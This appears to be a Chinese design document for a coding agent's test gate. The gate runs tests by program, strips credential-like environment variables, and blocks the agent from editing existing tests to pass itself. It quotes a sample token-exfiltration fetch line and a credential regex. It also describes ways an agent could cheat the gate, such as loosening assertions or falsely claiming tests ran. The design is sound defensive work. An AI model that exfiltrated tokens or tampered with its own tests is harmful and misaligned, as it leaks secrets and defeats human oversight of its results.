>    「需求变更顺带更新测试」是正当场景，但那是**人的决定**，不该是默认行为。
> 2. **测试命令的来源** → **固定白名单，绝不读 `scripts.test` 并直接执行**（卡 §7 M4-1）。
>    落地方案比原计划更强：**完全不经过 `npm`/`npx`**，命令从白名单里按**文件存在性**选

>

## 1. 目标（一句话）🟦

**把 test 闸门里「测试到底过没过」这个事实性判断从 LLM 手里收回 —— 由程序真跑命令并取 exit code；LLM 只保留「需求是否被实现」的语义判断；两者以正交字段合成最终 `passed`，并识别「测试文件是否被 agent 自己改动」这一自证风险。**

### 核心设计：判据归属表（M4 的灵魂）

M4 不是「用程序替换 LLM」，而是**分工** —— 把 LLM 结构上做不到的事拿走，把它真正擅长的留下。

| 字段 | 现状（M3） | M4 归属 | 理由（第一性原理） |
|---|---|---|---|
| `testsPassed` | **不存在**（混在 `passed` 里） | 🟢 **程序** | 是**事实**，需执行能力。LLM 没有执行能力 |
| `requirementMet` | **不存在**（混在 `passed` 里） | 🔵 **LLM** | 是**语义判断**，需阅读理解。程序做不到 |
| `passed` | LLM 单判 | 🟢 **合成**（程序） | `(testsPassed !== false) && requirementMet` |
| `report` | LLM | 🔵 LLM（保持） | 解读与说明 |
| `agentModifiedTests` | **不存在** | 🟢 **程序** | 是**事实**，diff 文件列表比对即可判定 |
| `review.decision` | LLM | 🔵 LLM（保持） | 主观判断，无可程序化判据 |
| `commit.message` | LLM | 🔵 LLM（保持） | 无 commitlint，格式校验不适用 |
| 上次 schema 校验错误 | 未回灌 | 🟢 **程序**（P0-2） | 是事实；不喂回去，重试就是盲的 |

> **为什么必须拆字段，而不是让程序覆写 `passed`**
> 因为 `passed` 这个名字底下压着**两个性质完全不同**的问题：
> ①「测试过了吗」（事实，程序判）②「需求实现了吗」（语义，LLM 判）。
> 合成成一个布尔值之后，事后无法分辨「判负是因为测试红」还是「判负是因为模型认为需求没做」——
> 排障时这一条信息最贵。拆开后每个结论都能单独追溯。
>
> ⚠️ **`testsPassed = null` 绝不可等价于 `true`**。「没有测试」和「需求实现了」是两件事，
> 混为一谈就是 M2 那次 `lintPassed` 幻觉的同构错误。

| 理由 | 说明 |

| **M3 已闭合，闸门判负路径已就位** | M3 八项全过（2026-09-15）。`dev-workflow.ts` 的「判负即终止」已实证，M4 的程序化判负可直接复用这条路径，无需再动编排结构 |

| **skill 里的禁令是无机制支撑的祈祷** | `code-testing/SKILL.md` 写着「禁止声称跑过实际未执行的测试」。**没有任何机制能阻止它说谎**，只能求它别说。程序真跑之后，「声称」变成「事实」 |
| **核心债 S3** | 路线图里 M4 承载的就是「真闸门」这条核心债（旧工单 S3）。不还这笔债，整条链路的质量结论都是自评 |
| **M3 把代价抬高了** | M3 起产物会真推到远端、真开 PR。此时「闸门是自评」意味着**可能把不合规的东西推给了别人看**。代价变了，闸门就必须变真 |

## 3. 范围 / 明确不做 🟦

**做**

- **程序侧测试执行器**（新建 adapter）：探测 → 执行 → 取 exit code → 超时 → 输出截断
- **靶场构造**：给 `wintim1143/pr-agent-e2e` 补「被测文件 + **人工预置**测试」，让 M4 有可跑的真实对象（当前靶场是 README-only，无 `package.json`）
- **契约重定义**：`TestGateSchema` 从 `{passed, report}` 拆为 `{testsPassed, requirementMet, report}` 等正交字段
- **无测试可跑时的明确语义**：`testsPassed = null`，而非假通过
- **`agentModifiedTests` 检测**：用本次 diff 的文件列表比对测试文件模式，识别「自己出卷自己判卷」
- **吸收 P0-2**：`runGate` 重试时回灌上次 zod 校验错误（现在重试是盲的）
- **吸收 P2-5**：AC 证据串的并列表述改为逐项可判定（M3 收口时发现「三项并列显示」会误导成「三项都挂」）
- 端到端验证 + AC 矩阵 + flow 图

**明确不做**（留给后续里程碑）

- **不做 baseline 对比**（区分「改动引入的失败」与「仓库本来就失败」）：需要 stash / worktree 双跑，成本高，先在 `report` 里提示即可。若确有需要再单列
- **不做「判负回退 coding 重做」**：与 M3-8 的结论一致，仍**只做终止**。回退需要循环 + 次数上限 + 失败累积策略，属独立工作量
- **不做 lint 闸门**：本项目无 lint 工具链（`npm run lint` 本环境冷启动卡死），引入等于凭空造一个 agent 可改的判据
- **不做 review 闸门的程序化**：`decision` 是主观判断，无可程序化判据。
  （⚠️ 但「review `comments` 里引用的文件 / 行号是否真实存在」是**可程序校验**的防幻觉点 —— 同属「事实 vs 语义」主题，列为 M5+ 候选，见 §9）
- **不做 PR 上的 CI（GitHub Actions）集成**：那是另一条实现路径（判据在远端跑），与本里程碑的「本地程序跑」是两种架构，不混做
- 不做多仓库 / 不做 GitHub App 鉴权 / 不做幂等防重复触发（M5）
- 不做 run 追踪 / 成本回写 / 失败告警（M6）

## 4. 端到端演示效果 🟦

**给定一条 issue 要求改靶场的被测文件 —— agent 改对时，程序真跑测试拿到 exit 0，流程继续；agent 改坏时，程序跑到非零退出码，闸门当场判负终止，不 commit、不 push、不开 PR。**

三条可复现的演示路径（靶场 issue 设计，详见 §7 M4-2）：

| 路径 | issue 要求 | 预期 |
|---|---|---|
| **A 通过** | 新增一个未被测试覆盖的函数（不动既有行为） | 测试仍绿 → `testsPassed=true` + `requirementMet=true` → 继续 |
| **B 回归判负** | 重构既有函数，**明确要求输入输出完全不变** | agent 手滑改坏 → 测试红 → `testsPassed=false` → **终止，无 push** |
| **C 自证拦截** | 修改测试断言使其放宽 | `agentModifiedTests=true` → 按 §0 待拍板项处置 |

## 7. 任务分解 🟨

### M4-1 测试执行器（程序侧）✅
- 内容：新建 `src/mastra/adapters/test-runner.ts`
  - **探测**：`package.json` 存在？`scripts.test` 存在？（靶场当前为否 → 走 null 分支）
  - **执行**：固定 runner + **`--ignore-scripts`**（防 `pre/post/prepare` 生命周期钩子被利用）；带超时；输出尾部截断
  - **返回契约**：`{ executed: boolean; command?: string; exitCode?: number; durationMs?: number; outputTail?: string; reason?: string }`
  - ⚠️ **命令白名单**（§0 待拍板项 2）：**不读 agent 可改的 `scripts.test` 字段并直接执行** —— 那等于给围栏开 RCE 旁路
- ✅ **实际实施**（2026-09-15）：比原计划多做了三处
  1. **完全不经过 npm/npx** —— 命令按**文件存在性**从白名单选（jest / vitest / 内置 `node --test`），

  2. **子进程 env 剥离疑似凭据**（`/TOKEN|SECRET|PASSWORD|CREDENTIAL|_KEY$|AUTH/i`）——
     否则 agent 写的一行 `fetch('evil/'+process.env.GITHUB_TOKEN)` 就能把 token 带出去
  3. **`discoverTestFiles()` 发现性检查** —— 实测发现 `node --test` 在「零测试文件」时**退出码为 0**，
     直接采信会得到假通过（详见 §0 末尾的决策说明）
- ✅ 验收：单测 24 条覆盖全部四条分支 + AC-8/AC-7/AC-3 的安全与边界断言

### M4-2 靶场构造（M4 的验收对象）✅
- 内容：给 `D:\code\pr-agent-e2e` 补三样东西，**零依赖、无需 `npm install`**：
  - `package.json`（`scripts.test` 指向内置 runner）
  - 一个**被测文件**（如 `src/greet.js`）
  - 一份**人工预置的测试**（用 `node:test` + `node:assert`，秒级跑完）
- 验收：靶场本地能手动跑通测试；改坏被测文件后能跑红。**issue A/B/C 三条路径都能构造出来**
- 📌 **为什么测试必须人工预置**：若测试由 agent 自己写，就是「自己出卷自己判卷」——
  agent 完全可以让断言恒真。只有人写的测试才构成**需求的可执行规格**
- 📌 **这份构造同时回答了一个前提问题**：测试验的是「有没有破坏既有行为」（回归），
  **不是**「需求实现了吗」。两者正交 —— 唯一交集就是「测试由人预先写好当规格」这一种情况
- ✅ **实际实施**：`package.json` + `src/greet.js`（`greet(name)`，模板写死为 `Hello, %s!`）+ `test/greet.test.js`（4 条断言）
  已提交并推到靶场 `main`（`e2d1ee7 → 21f4e7a`）。
  **B/C 路径之所以是确定的**：issue 要求「把前缀改成 Hi」而人工测试断言 `Hello, X!` —— 判负不靠模型心情。

### M4-3 契约重定义（test 闸门）✅
- 内容：`TestGateSchema` 从 `{passed, report}` 改为正交字段；`testStep` 改为
  「先程序跑 → 填 `testsPassed` → 再让 LLM 判 `requirementMet` → 程序合成 `passed`」
- 验收：单测 + 端到端。**关键断言：`testsPassed` 的值在任何情况下都不来自 LLM 输出**
- ✅ **实际实施**：拆成三个 schema —— `LlmTestGateSchema{requirementMet,report}`（给 LLM）、
  `TestRunSchema`（程序侧事实）、`TestGateSchema`（合成后，含 `passed`/`report`/`agentModifiedTests`）。
  `buildPrBody` 同步改为**分列显示**程序侧事实与 LLM 侧语义。
  ⚠️ 顺带修掉一处硬编码：`buildChangeContext` 原把 `'main'` 写死，base 改名后 diff 会静默变空 → 改为读 `GITHUB_BASE_BRANCH`

### M4-4 「无测试可跑」的明确语义 ✅
- 内容：`testsPassed = null`（不是 `true`）；`passed` 只由 `requirementMet` 决定；
  **`report` 必须显式标注「本次未跑测试」**，防止下游误读成「测试通过」
- 验收：靶场路径 A（或临时移除测试）验证 —— `null` 时不假通过、且标注可见
- ✅ **实际实施**：`report` 改为**程序前缀 + LLM 解读**拼接。前缀由程序写死（`[程序] 本次未执行测试 … testsPassed=null（未知,不是通过)`），
  不依赖模型自觉写出 —— 事实陈述不能寄望于 LLM 主动提及

### M4-5 `agentModifiedTests` 检测 ✅
- 内容：用本次 diff 的文件列表比对测试文件模式（`test/`、`*.test.js`、`*.spec.ts` 等），
  命中则置 `agentModifiedTests = true`
- 验收：靶场路径 C —— agent 改测试断言时检测命中
- ✅ **实际实施**：新增 `gitChangedFilesWithStatus()`（带 A/M/D 状态），
  并把单一布尔拆成 `modified`（改/删既有测试 → **默认阻断**）/ `added`（新增 → 仅记录）。
  📌 **为什么要拆**：不拆的话，一个「顺手给新函数补个测试」的良性 agent 会被误拦 ——
  而新增测试**不可能削弱既有断言**，危害等级与「改卷」不同。这不是洁癖，是路径 A 的真实风险。

### M4-6 吸收 P0-2：`runGate` 重试回灌 zod 报错 ✅
- 内容：`runGate` 重试时，把**上一次的 zod 校验错误**追加进下次 prompt，让模型能自我修正。
  现状：重试是盲的 —— 模型不知道自己错在哪，第 N 次还是同样的错
- 验收：单测（mock 连续两次失败后成功，断言第二次的 prompt 里含上次错误信息）
- 📌 价值随 M4 上升：拆字段后 schema 更复杂，格式失败率会涨 —— 盲重试的成本随之变高

## 10. 异常与兜底 🟨

| 已知异常 | 判定条件（可执行） | 降级行为 | 是否阻断 AC |
|---|---|---|---|
| 目标仓库无 `package.json` | 文件不存在 | `testsPassed = null`，reason 标注 | 否 |
| 有 `package.json` 但无 test script | `scripts.test` 缺失或全空白 | 同上 | 否 |
| **声明了测试但盘上无测试文件** | `discoverTestFiles()` 返回空 | `executed:false / no-test-files` → `testsPassed = null` | 否 |
| 测试超时 | 执行 > `TEST_TIMEOUT_MS`（缺省 120s） | kill 进程树 + `testsPassed=false` + 标注超时 | 是（判负） |
| runner 起不来 | spawn error `ENOENT` | `testsPassed = null` + reason | 否 |
| 测试输出过大 | 输出 > `TEST_OUTPUT_MAX_CHARS`（缺省 4000） | 尾部截断 + 标注 `truncated` | 否 |
| agent 改了既有测试文件 | diff 状态为 M/D/R 且命中测试模式 | `agentModifiedTests = true` → **默认阻断**（`TEST_GUARD_MODIFY_TESTS=warn` 可降级） | 是（阻断） |
| agent 新增测试文件 | diff 状态为 A 且命中测试模式 | 仅记录 `addedTestFiles`，**不阻断**（不削弱既有断言） | 否 |
| 靶场构造被 M3 的 `--clean-remote` 误删 | 靶场缺 `package.json`/测试文件 | 按「无测试可跑」处理（不报错，但 M4 的 AC 会失效） | 否（但会掩盖 AC） |

- **本轮核实的新事实（源码级）**
  1. **`node --test` 在零测试文件时退出码 = 0**。实测：只有 `package.json` 而无测试文件的夹具 →
     `executed:true, exitCode:0`。**若直接采信退出码，这就是一个纯粹的假通过**。
     已加 `discoverTestFiles()` 盘上发现性检查 → `executed:false / no-test-files`。
     ⚠️ 该检查**不能走 git**：单测的临时夹具不是 git 仓库，`git ls-files` 会直接失败 →

  2. **超时必须杀进程树 ⇒ 不能用 `spawnSync`**。`spawnSync` 不返回 pid，无法 `taskkill /T`；
     而 `node --test` 默认 **fork 子进程**跑用例文件 → 只杀直接子进程会留孤儿。

     实测：1.2s 预算的死循环在 **1.6s 内**返回。
  3. **`run.start()` 判负时 `resolve` 而非 `reject`**：返回 `{ status:'failed', error:<原因> }`。
